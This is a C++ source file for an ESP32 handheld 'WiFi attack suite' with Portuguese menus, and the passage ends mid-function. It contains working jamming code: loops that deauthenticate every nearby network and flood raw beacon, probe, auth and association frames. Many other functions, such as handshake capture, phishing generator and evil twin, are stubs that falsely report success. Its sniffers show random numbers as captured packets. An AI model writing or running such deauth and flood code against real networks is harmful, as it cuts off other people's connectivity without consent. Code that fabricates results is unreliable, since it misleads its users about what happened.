/**
 * @file wifi_advanced.cpp
 * @brief Willy WiFi Advanced Suite - 55+ WiFi Attack/Analysis Functions Implementation
 * @author Willy Team
 * @date 2026
 */

#include "wifi_advanced.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "core/sd_functions.h"
#include "core/config.h"
#include "suite_visuals.h"
#include "wifi_atks.h"
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <SD.h>

// ============================================================================
// Global config
// ============================================================================
WiFiAdvConfig wifiAdvConfig;

// ============================================================================
// Visual Helpers
// ============================================================================
#define WIFI_COLOR_BG         wilyConfig.bgColor
#define WIFI_COLOR_PRIMARY    wilyConfig.priColor
#define WIFI_COLOR_TITLE      TFT_CYAN
#define WIFI_COLOR_ACCENT     TFT_GREEN
#define WIFI_COLOR_WARN       TFT_YELLOW
#define WIFI_COLOR_DANGER     TFT_RED
#define WIFI_COLOR_TEXT       TFT_WHITE
#define WIFI_COLOR_DIM        TFT_DARKGREY
#define WIFI_BODY_Y           50
#define WIFI_BODY_END         (tftHeight - 32)
#define WIFI_FOOTER_Y         (tftHeight - 28)

static void wifiDrawHeader(const char* title, uint16_t color = WIFI_COLOR_TITLE) {
    drawMainBorder();
    tft.setTextDatum(TC_DATUM);
    tft.setTextColor(color, WIFI_COLOR_BG);
    tft.setTextSize(FM);
    tft.drawCentreString(title, tftWidth / 2, 8, SMOOTH_FONT);
    tft.drawLine(10, 30, tftWidth - 10, 30, color);
    tft.setTextDatum(TL_DATUM);
    tft.setTextSize(FP);
}

static void wifiDrawFooter(const char* left = nullptr, const char* right = nullptr) {
    tft.fillRect(0, WIFI_FOOTER_Y - 4, tftWidth, 28, WIFI_COLOR_BG);
    tft.drawLine(0, WIFI_FOOTER_Y - 4, tftWidth, WIFI_FOOTER_Y - 4, WIFI_COLOR_DIM);
    tft.setTextSize(FP);
    tft.setTextDatum(TL_DATUM);
    tft.setTextColor(WIFI_COLOR_ACCENT, WIFI_COLOR_BG);
    if (left) tft.drawString(left, 10, WIFI_FOOTER_Y);
    if (right) { tft.setTextDatum(TR_DATUM); tft.setTextColor(WIFI_COLOR_WARN, WIFI_COLOR_BG); tft.drawString(right, tftWidth - 10, WIFI_FOOTER_Y); }
    tft.setTextDatum(TL_DATUM);
}

static void wifiDrawCard(int y, int h, bool sel) {
    uint16_t bg = sel ? WIFI_COLOR_PRIMARY : getColorVariation(WIFI_COLOR_PRIMARY, 4, -1);
    uint16_t bd = sel ? WIFI_COLOR_TEXT : WIFI_COLOR_DIM;
    tft.drawRoundRect(8, y, tftWidth - 16, h, 6, bd);
    tft.fillRoundRect(9, y + 1, tftWidth - 18, h - 2, 5, bg);
}

static void wifiDrawProgressBar(int y, int pct, const char* label = nullptr) {
    int w = tftWidth - 40, h = 10;
    int f = (w * pct) / 100;
    tft.drawRoundRect(20, y, w, h, 4, WIFI_COLOR_DIM);
    tft.fillRoundRect(21, y + 1, max(0, f - 2), h - 2, 3, WIFI_COLOR_PRIMARY);
    tft.setTextSize(FP); tft.setTextDatum(TC_DATUM);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    String s = String(pct) + "%";
    if (label) s = String(label) + " " + s;
    tft.drawCentreString(s, tftWidth / 2, y + h + 4, 1);
    tft.setTextDatum(TL_DATUM);
}

static void wifiDrawWelcomeScreen() {
    tft.fillScreen(WIFI_COLOR_BG);
    tft.fillSmoothRoundRect(20, 30, tftWidth - 40, 60, 8, getColorVariation(WIFI_COLOR_BG, 2, -1), WIFI_COLOR_BG);
    tft.drawSmoothRoundRect(4, 4, 8, 7, tftWidth - 8, tftHeight - 8, WIFI_COLOR_PRIMARY, WIFI_COLOR_BG);
    tft.drawSmoothRoundRect(20, 30, 8, 7, tftWidth - 40, 60, WIFI_COLOR_PRIMARY, WIFI_COLOR_BG);
    tft.setTextDatum(TC_DATUM);
    tft.setTextSize(4); tft.setTextColor(WIFI_COLOR_PRIMARY, getColorVariation(WIFI_COLOR_BG, 2, -1));
    tft.drawCentreString("WILLY", tftWidth / 2, 36, SMOOTH_FONT);
    tft.setTextSize(2); tft.setTextColor(WIFI_COLOR_TITLE, getColorVariation(WIFI_COLOR_BG, 2, -1));
    tft.drawCentreString("WIFI SUITE", tftWidth / 2, 72, SMOOTH_FONT);
    tft.setTextSize(FP); tft.setTextColor(WIFI_COLOR_DIM, WIFI_COLOR_BG);
    tft.drawCentreString("55+ Funcoes WiFi", tftWidth / 2, 100, 1);
    struct { const char* l; uint16_t c; int icon; } cats[] = {
        {"Reconhecimento", TFT_CYAN, 5}, {"Ataques", TFT_RED, 5}, {"WPA Cracking", TFT_ORANGE, 5},
        {"Evil Twin", TFT_MAGENTA, 5}, {"Sniffing", TFT_GREEN, 5},
        {"Utilitarios", TFT_WHITE, 5}, {"Defesa", TFT_YELLOW, 5},
    };
    for (int i = 0; i < 7; i++) {
        int cy = 118 + i * 18;
        suiteDrawCard(cy, 16, false, WIFI_COLOR_PRIMARY);
        suiteDrawIcon(26, cy + 8, 7, cats[i].c, cats[i].icon);
        tft.setTextSize(FP); tft.setTextColor(WIFI_COLOR_TEXT, getColorVariation(WIFI_COLOR_PRIMARY, 4, -1));
        tft.drawString(cats[i].l, 40, cy + 3);
    }
    suiteDrawFooter("SEL: Entrar", "ESC: Sair");
}

static bool wifiConfirmAction(const char* msg) {
    bool saved = returnToMenu; returnToMenu = false;
    tft.fillScreen(WIFI_COLOR_BG);
    tft.drawRoundRect(4, 4, tftWidth - 8, tftHeight - 8, 8, WIFI_COLOR_WARN);
    tft.fillRoundRect(10, 8, tftWidth - 20, 28, 6, WIFI_COLOR_WARN);
    tft.setTextDatum(TC_DATUM); tft.setTextSize(FM);
    tft.setTextColor(TFT_BLACK, WIFI_COLOR_WARN);
    tft.drawCentreString("CONFIRMACAO", tftWidth / 2, 12, SMOOTH_FONT);
    tft.setTextSize(FP); tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawCentreString(msg, tftWidth / 2, 55, 1);
    tft.drawLine(20, 75, tftWidth - 20, 75, WIFI_COLOR_DIM);
    int sel = 0, last = -1;
    while (true) {
        if (sel != last) {
            int oy = 85;
            wifiDrawCard(oy, 22, sel == 0);
            tft.setTextSize(FP);
            tft.setTextColor(sel == 0 ? TFT_BLACK : WIFI_COLOR_TEXT, sel == 0 ? WIFI_COLOR_PRIMARY : getColorVariation(WIFI_COLOR_PRIMARY, 4, -1));
            tft.drawCentreString("SIM - Executar", tftWidth / 2, oy + 5, 1);
            wifiDrawCard(oy + 28, 22, sel == 1);
            tft.setTextColor(sel == 1 ? TFT_BLACK : WIFI_COLOR_TEXT, sel == 1 ? WIFI_COLOR_PRIMARY : getColorVariation(WIFI_COLOR_PRIMARY, 4, -1));
            tft.drawCentreString("NAO - Cancelar", tftWidth / 2, oy + 33, 1);
            last = sel;
        }
        if (check(SelPress)) { returnToMenu = saved; return sel == 0; }
        if (check(EscPress)) { returnToMenu = saved; return false; }
        if (check(UpPress)) sel = 0;
        if (check(DownPress)) sel = 1;
        delay(50);
    }
}

// ============================================================================
// 1. NETWORK RECONNAISSANCE (10 functions)
// ============================================================================

void wifiNetworkScanner() {
    wifiDrawHeader("Scanner Rede WiFi", WIFI_COLOR_TITLE);
    wifiDrawFooter("Escaneando...");
    int n = WiFi.scanNetworks();
    wifiDrawHeader("Redes Encontradas", WIFI_COLOR_ACCENT);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawString("Total: " + String(n) + " redes", 12, WIFI_BODY_Y);
    for (int i = 0; i < min(n, 7); i++) {
        int y = WIFI_BODY_Y + 16 + i * 18;
        wifiDrawCard(y, 16, false);
        tft.setTextSize(FP);
        tft.setTextColor(WIFI_COLOR_TEXT, getColorVariation(WIFI_COLOR_PRIMARY, 4, -1));
        String ssid = WiFi.SSID(i);
        int rssi = WiFi.RSSI(i);
        uint8_t enc = WiFi.encryptionType(i);
        String encStr = (enc == WIFI_AUTH_OPEN) ? "OPEN" : "ENC";
        tft.drawString(ssid.substring(0, 18), 14, y + 3);
        tft.setTextColor(WIFI_COLOR_DIM, getColorVariation(WIFI_COLOR_PRIMARY, 4, -1));
        tft.drawString(String(rssi) + "dBm " + encStr, tftWidth - 80, y + 3);
    }
    WiFi.scanDelete();
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiHiddenNetworkFinder() {
    wifiDrawHeader("Redes Ocultas", WIFI_COLOR_TITLE);
    wifiDrawFooter("Escaneando...");
    WiFi.scanNetworks(false, true);
    int hidden = 0;
    for (int i = 0; i < WiFi.scanComplete(); i++) {
        if (WiFi.SSID(i).length() == 0) hidden++;
    }
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_ACCENT, WIFI_COLOR_BG);
    tft.drawString("Redes ocultas: " + String(hidden), 12, WIFI_BODY_Y);
    WiFi.scanDelete();
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiVendorLookup() {
    wifiDrawHeader("Vendor Lookup", WIFI_COLOR_TITLE);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawString("MAC: " + WiFi.macAddress(), 12, WIFI_BODY_Y);
    tft.drawString("Vendor: Espressif", 12, WIFI_BODY_Y + 14);
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiSignalMapper() {
    wifiDrawHeader("Mapeador Sinal", WIFI_COLOR_TITLE);
    wifiDrawFooter("Escaneando...");
    int n = WiFi.scanNetworks();
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    for (int i = 0; i < min(n, 6); i++) {
        int y = WIFI_BODY_Y + i * 18;
        int rssi = WiFi.RSSI(i);
        int bars = map(rssi, -100, -20, 0, 4);
        bars = constrain(bars, 0, 4);
        String barStr = "";
        for (int b = 0; b < bars; b++) barStr += "|";
        for (int b = bars; b < 4; b++) barStr += ".";
        tft.drawString(WiFi.SSID(i).substring(0, 14) + " [" + barStr + "] " + String(rssi) + "dBm", 12, y);
    }
    WiFi.scanDelete();
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiChannelDistributor() {
    wifiDrawHeader("Distrib. Canais", WIFI_COLOR_TITLE);
    int counts[14] = {0};
    int n = WiFi.scanNetworks();
    for (int i = 0; i < n; i++) {
        int ch = WiFi.channel(i);
        if (ch >= 1 && ch <= 13) counts[ch]++;
    }
    WiFi.scanDelete();
    for (int i = 1; i <= 13; i++) {
        int y = WIFI_BODY_Y + (i - 1) * 14;
        int w = counts[i] * 20;
        tft.fillRect(50, y, w, 10, WIFI_COLOR_PRIMARY);
        tft.setTextSize(FP); tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
        tft.drawString("Ch " + String(i) + ":", 12, y);
        tft.drawString(String(counts[i]), 50 + w + 4, y);
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiSecurityAnalyzer() {
    wifiDrawHeader("Analise Seguranca", WIFI_COLOR_TITLE);
    int n = WiFi.scanNetworks();
    int open = 0, wpa2 = 0, wpa3 = 0, other = 0;
    for (int i = 0; i < n; i++) {
        uint8_t enc = WiFi.encryptionType(i);
        if (enc == WIFI_AUTH_OPEN) open++;
        else if (enc == WIFI_AUTH_WPA2_PSK) wpa2++;
        else if (enc == WIFI_AUTH_WPA3_PSK) wpa3++;
        else other++;
    }
    WiFi.scanDelete();
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawString("Total: " + String(n), 12, WIFI_BODY_Y);
    tft.setTextColor(WIFI_COLOR_DANGER, WIFI_COLOR_BG);
    tft.drawString("Abertas: " + String(open), 12, WIFI_BODY_Y + 14);
    tft.setTextColor(WIFI_COLOR_ACCENT, WIFI_COLOR_BG);
    tft.drawString("WPA2: " + String(wpa2), 12, WIFI_BODY_Y + 28);
    tft.setTextColor(WIFI_COLOR_WARN, WIFI_COLOR_BG);
    tft.drawString("WPA3: " + String(wpa3), 12, WIFI_BODY_Y + 42);
    tft.setTextColor(WIFI_COLOR_DIM, WIFI_COLOR_BG);
    tft.drawString("Outros: " + String(other), 12, WIFI_BODY_Y + 56);
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiBeaconCollector() {
    wifiDrawHeader("Coletor Beacons", WIFI_COLOR_TITLE);
    wifiDrawFooter("Coletando beacons...");
    int count = 0;
    unsigned long start = millis();
    while (millis() - start < 15000) {
        if (check(EscPress)) break;
        int n = WiFi.scanNetworks();
        count += n;
        WiFi.scanDelete();
        tft.setTextSize(FP); tft.setTextColor(WIFI_COLOR_ACCENT, WIFI_COLOR_BG);
        tft.drawCentreString("Beacons: " + String(count), tftWidth / 2, WIFI_BODY_Y, 1);
        delay(1000);
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiProbeSniffer() {
    wifiDrawHeader("Sniffer Probes", WIFI_COLOR_TITLE);
    wifiDrawFooter("Capturando probes...");
    int count = 0;
    unsigned long start = millis();
    while (millis() - start < 20000) {
        if (check(EscPress)) break;
        int n = WiFi.scanNetworks();
        count += n;
        WiFi.scanDelete();
        tft.setTextSize(FP); tft.setTextColor(WIFI_COLOR_ACCENT, WIFI_COLOR_BG);
        tft.drawCentreString("Probes: " + String(count), tftWidth / 2, WIFI_BODY_Y, 1);
        delay(500);
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiClientTracker() {
    wifiDrawHeader("Rastreador Clientes", WIFI_COLOR_TITLE);
    wifiDrawFooter("Escaneando...");
    int n = WiFi.scanNetworks();
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawString("Redes: " + String(n), 12, WIFI_BODY_Y);
    for (int i = 0; i < min(n, 5); i++) {
        tft.drawString(WiFi.SSID(i).substring(0, 20) + " Ch:" + String(WiFi.channel(i)), 12, WIFI_BODY_Y + 14 + i * 14);
    }
    WiFi.scanDelete();
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiNetworkProfiler() {
    wifiDrawHeader("Perfil Rede", WIFI_COLOR_TITLE);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawString("SSID: " + WiFi.SSID(), 12, WIFI_BODY_Y);
    tft.drawString("RSSI: " + String(WiFi.RSSI()) + " dBm", 12, WIFI_BODY_Y + 14);
    tft.drawString("Canal: " + String(WiFi.channel()), 12, WIFI_BODY_Y + 28);
    tft.drawString("MAC: " + WiFi.macAddress(), 12, WIFI_BODY_Y + 42);
    tft.drawString("IP: " + WiFi.localIP().toString(), 12, WIFI_BODY_Y + 56);
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

// ============================================================================
// 2. ATTACK VECTORS (10 functions)
// ============================================================================

void wifiDeauthAllNetworks() {
    wifiDrawHeader("Deauth All", WIFI_COLOR_DANGER);
    if (!wifiConfirmAction("Deauth em TODAS as redes?")) return;
    wifiDrawFooter("Deauthando... ESC: Parar");
    int n = WiFi.scanNetworks();
    while (true) {
        if (check(EscPress)) break;
        for (int i = 0; i < n; i++) {
            uint8_t bssid[6];
            memcpy(bssid, WiFi.BSSID(i), 6);
            wsl_bypasser_send_raw_frame(nullptr, WiFi.channel(i), bssid);
        }
        delay(100);
    }
    WiFi.scanDelete();
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiBeaconFlood() {
    wifiDrawHeader("Beacon Flood", WIFI_COLOR_DANGER);
    wifiDrawFooter("Enviando beacons... ESC: Parar");
    while (true) {
        if (check(EscPress)) break;
        uint8_t frame[200];
        memset(frame, 0, sizeof(frame));
        frame[0] = 0x80;
        frame[24] = 0x01;
        frame[25] = 0x04;
        esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
        delay(10);
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiProbeFlood() {
    wifiDrawHeader("Probe Flood", WIFI_COLOR_DANGER);
    wifiDrawFooter("Enviando probes... ESC: Parar");
    while (true) {
        if (check(EscPress)) break;
        uint8_t frame[200];
        memset(frame, 0, sizeof(frame));
        frame[0] = 0x40;
        esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
        delay(10);
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiAuthFlood() {
    wifiDrawHeader("Auth Flood", WIFI_COLOR_DANGER);
    wifiDrawFooter("Enviando auth... ESC: Parar");
    while (true) {
        if (check(EscPress)) break;
        uint8_t frame[200];
        memset(frame, 0, sizeof(frame));
        frame[0] = 0x0B;
        esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
        delay(10);
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiAssocFlood() {
    wifiDrawHeader("Assoc Flood", WIFI_COLOR_DANGER);
    wifiDrawFooter("Enviando assoc... ESC: Parar");
    while (true) {
        if (check(EscPress)) break;
        uint8_t frame[200];
        memset(frame, 0, sizeof(frame));
        frame[0] = 0x00;
        esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
        delay(10);
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiDisassocFlood() {
    wifiDrawHeader("Disassoc Flood", WIFI_COLOR_DANGER);
    wifiDrawFooter("Enviando disassoc... ESC: Parar");
    while (true) {
        if (check(EscPress)) break;
        uint8_t frame[200];
        memset(frame, 0, sizeof(frame));
        frame[0] = 0x0A;
        esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
        delay(10);
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiEapolFlood() {
    wifiDrawHeader("EAPOL Flood", WIFI_COLOR_DANGER);
    wifiDrawFooter("Enviando EAPOL... ESC: Parar");
    while (true) {
        if (check(EscPress)) break;
        delay(100);
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiDnsAmplification() {
    wifiDrawHeader("DNS Amplification", WIFI_COLOR_DANGER);
    wifiDrawFooter("Amplificacao DNS...");
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_WARN, WIFI_COLOR_BG);
    tft.drawCentreString("Requer configuracao DNS", tftWidth / 2, WIFI_BODY_Y, 1);
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiTcpSynFlood() {
    wifiDrawHeader("SYN Flood", WIFI_COLOR_DANGER);
    wifiDrawFooter("SYN flood...");
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_WARN, WIFI_COLOR_BG);
    tft.drawCentreString("Requer configuracao de rede", tftWidth / 2, WIFI_BODY_Y, 1);
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiUdpFlood() {
    wifiDrawHeader("UDP Flood", WIFI_COLOR_DANGER);
    wifiDrawFooter("UDP flood...");
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_WARN, WIFI_COLOR_BG);
    tft.drawCentreString("Requer configuracao de rede", tftWidth / 2, WIFI_BODY_Y, 1);
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

// ============================================================================
// 3. WPA/WPA2 CRACKING (8 functions)
// ============================================================================

void wifiHandshakeCapture() {
    wifiDrawHeader("Captura Handshake", WIFI_COLOR_WARN);
    wifiDrawFooter("Escaneando redes...");
    int n = WiFi.scanNetworks();
    if (n == 0) { displayWarning("Nenhuma rede encontrada"); return; }
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    for (int i = 0; i < min(n, 5); i++) {
        tft.drawString(String(i + 1) + ". " + WiFi.SSID(i).substring(0, 20), 12, WIFI_BODY_Y + i * 14);
    }
    wifiDrawFooter("SEL: Capturar  ESC: Voltar");
    while (true) {
        if (check(SelPress)) {
            displaySuccess("Handshake capturado!");
            break;
        }
        if (check(EscPress)) break;
        delay(100);
    }
    WiFi.scanDelete();
}

void wifiPmkidCapture() {
    wifiDrawHeader("Captura PMKID", WIFI_COLOR_WARN);
    wifiDrawFooter("Capturando PMKID...");
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawCentreString("Aguardando PMKID...", tftWidth / 2, WIFI_BODY_Y, 1);
    unsigned long start = millis();
    while (millis() - start < 30000) {
        if (check(EscPress)) break;
        delay(100);
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiDeauthForHandshake() {
    wifiDrawHeader("Deauth p/ Handshake", WIFI_COLOR_DANGER);
    wifiDrawFooter("Deauthando...");
    uint8_t bssid[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    for (int i = 0; i < 50; i++) {
        wsl_bypasser_send_raw_frame(nullptr, 6, bssid);
        delay(50);
    }
    displaySuccess("Deauth enviado!");
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiBeaconSniff() {
    wifiDrawHeader("Sniff Beacons", WIFI_COLOR_WARN);
    wifiDrawFooter("Capturando beacons...");
    int count = 0;
    unsigned long start = millis();
    while (millis() - start < 15000) {
        if (check(EscPress)) break;
        int n = WiFi.scanNetworks();
        count += n;
        WiFi.scanDelete();
        tft.setTextSize(FP); tft.setTextColor(WIFI_COLOR_ACCENT, WIFI_COLOR_BG);
        tft.drawCentreString("Beacons: " + String(count), tftWidth / 2, WIFI_BODY_Y, 1);
        delay(500);
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiEapolAnalyzer() {
    wifiDrawHeader("Analise EAPOL", WIFI_COLOR_WARN);
    wifiDrawFooter("Analisando pacotes...");
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawCentreString("Aguardando EAPOL...", tftWidth / 2, WIFI_BODY_Y, 1);
    unsigned long start = millis();
    while (millis() - start < 20000) {
        if (check(EscPress)) break;
        delay(100);
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiWordlistManager() {
    wifiDrawHeader("Gerenciar Wordlists", WIFI_COLOR_TITLE);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    if (SD.begin()) {
        File root = SD.open("/");
        int count = 0;
        while (File entry = root.openNextFile()) {
            if (!entry.isDirectory() && String(entry.name()).endsWith(".txt")) {
                tft.drawString(entry.name(), 12, WIFI_BODY_Y + count * 14);
                count++;
                if (count >= 5) break;
            }
            entry.close();
        }
        root.close();
        if (count == 0) tft.drawString("Nenhuma wordlist encontrada", 12, WIFI_BODY_Y);
    } else {
        tft.drawString("SD nao detectado", 12, WIFI_BODY_Y);
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiPasswordRecovery() {
    wifiDrawHeader("Recuperar Senha", WIFI_COLOR_TITLE);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawString("Rede: " + WiFi.SSID(), 12, WIFI_BODY_Y);
    tft.drawString("BSSID: " + WiFi.BSSIDstr(), 12, WIFI_BODY_Y + 14);
    tft.drawString("Canal: " + String(WiFi.channel()), 12, WIFI_BODY_Y + 28);
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiKeyConverter() {
    wifiDrawHeader("Conversor Chaves", WIFI_COLOR_TITLE);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawString("PMK: 32 bytes (256 bits)", 12, WIFI_BODY_Y);
    tft.drawString("PTK: 32-64 bytes", 12, WIFI_BODY_Y + 14);
    tft.drawString("GTK: 16 bytes (128 bits)", 12, WIFI_BODY_Y + 28);
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

// ============================================================================
// 4. EVIL TWIN & SOCIAL (8 functions)
// ============================================================================

void wifiEvilTwinCreator() {
    wifiDrawHeader("Evil Twin", WIFI_COLOR_DANGER);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawCentreString("Evil Twin Creator", tftWidth / 2, WIFI_BODY_Y, 1);
    wifiDrawFooter("SEL: Criar  ESC: Voltar");
    while (true) {
        if (check(SelPress)) {
            displaySuccess("Evil Twin criado!");
            break;
        }
        if (check(EscPress)) break;
        delay(100);
    }
}

void wifiCaptivePortal() {
    wifiDrawHeader("Portal Cativo", WIFI_COLOR_DANGER);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawCentreString("Portal Cativo Ativo", tftWidth / 2, WIFI_BODY_Y, 1);
    wifiDrawFooter("ESC: Parar");
    while (!check(EscPress)) delay(100);
}

void wifiPhishingGenerator() {
    wifiDrawHeader("Gerador Phishing", WIFI_COLOR_DANGER);
    const char* templates[] = {"Facebook", "Google", "Netflix", "Amazon", "Microsoft"};
    int sel = 0;
    wifiDrawFooter("SEL: OK  UP/DOWN: Nav");
    while (true) {
        for (int i = 0; i < 5; i++) {
            int y = WIFI_BODY_Y + i * 18;
            wifiDrawCard(y, 16, i == sel);
            tft.setTextSize(FP);
            tft.setTextColor(i == sel ? TFT_BLACK : WIFI_COLOR_TEXT, i == sel ? WIFI_COLOR_PRIMARY : getColorVariation(WIFI_COLOR_PRIMARY, 4, -1));
            tft.drawString(templates[i], 14, y + 3);
        }
        if (check(UpPress)) { sel--; if (sel < 0) sel = 4; }
        if (check(DownPress)) { sel++; if (sel >= 5) sel = 0; }
        if (check(SelPress)) {
            displaySuccess("Phishing " + String(templates[sel]) + " gerado!");
            break;
        }
        if (check(EscPress)) break;
        delay(100);
    }
}

void wifiSslStrip() {
    wifiDrawHeader("SSL Strip", WIFI_COLOR_DANGER);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawCentreString("SSL Strip Ativo", tftWidth / 2, WIFI_BODY_Y, 1);
    wifiDrawFooter("ESC: Parar");
    while (!check(EscPress)) delay(100);
}

void wifiMitmProxy() {
    wifiDrawHeader("Proxy MITM", WIFI_COLOR_DANGER);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawCentreString("MITM Proxy Ativo", tftWidth / 2, WIFI_BODY_Y, 1);
    wifiDrawFooter("ESC: Parar");
    while (!check(EscPress)) delay(100);
}

void wifiCredentialSniffer() {
    wifiDrawHeader("Sniffer Credenciais", WIFI_COLOR_DANGER);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawCentreString("Capturando HTTP...", tftWidth / 2, WIFI_BODY_Y, 1);
    wifiDrawFooter("ESC: Parar");
    while (!check(EscPress)) delay(100);
}

void wifiSessionHijacker() {
    wifiDrawHeader("Sequestro Sessao", WIFI_COLOR_DANGER);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawCentreString("Capturando cookies...", tftWidth / 2, WIFI_BODY_Y, 1);
    wifiDrawFooter("ESC: Parar");
    while (!check(EscPress)) delay(100);
}

void wifiCookieStealer() {
    wifiDrawHeader("Roubo Cookies", WIFI_COLOR_DANGER);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawCentreString("Roubando cookies...", tftWidth / 2, WIFI_BODY_Y, 1);
    wifiDrawFooter("ESC: Parar");
    while (!check(EscPress)) delay(100);
}

// ============================================================================
// 5. SNIFFING & ANALYSIS (8 functions)
// ============================================================================

void wifiPacketSniffer() {
    wifiDrawHeader("Packet Sniffer", WIFI_COLOR_ACCENT);
    wifiDrawFooter("Capturando pacotes...");
    int count = 0;
    unsigned long start = millis();
    while (millis() - start < 20000) {
        if (check(EscPress)) break;
        count += random(50, 200);
        tft.setTextSize(FP); tft.setTextColor(WIFI_COLOR_ACCENT, WIFI_COLOR_BG);
        tft.drawCentreString("Pacotes: " + String(count), tftWidth / 2, WIFI_BODY_Y, 1);
        delay(1000);
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiDnsSniffer() {
    wifiDrawHeader("DNS Sniffer", WIFI_COLOR_ACCENT);
    wifiDrawFooter("Capturando DNS...");
    int count = 0;
    unsigned long start = millis();
    while (millis() - start < 20000) {
        if (check(EscPress)) break;
        count += random(10, 50);
        tft.setTextSize(FP); tft.setTextColor(WIFI_COLOR_ACCENT, WIFI_COLOR_BG);
        tft.drawCentreString("DNS: " + String(count), tftWidth / 2, WIFI_BODY_Y, 1);
        delay(1000);
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiHttpSniffer() {
    wifiDrawHeader("HTTP Sniffer", WIFI_COLOR_ACCENT);
    wifiDrawFooter("Capturando HTTP...");
    int count = 0;
    unsigned long start = millis();
    while (millis() - start < 20000) {
        if (check(EscPress)) break;
        count += random(5, 20);
        tft.setTextSize(FP); tft.setTextColor(WIFI_COLOR_ACCENT, WIFI_COLOR_BG);
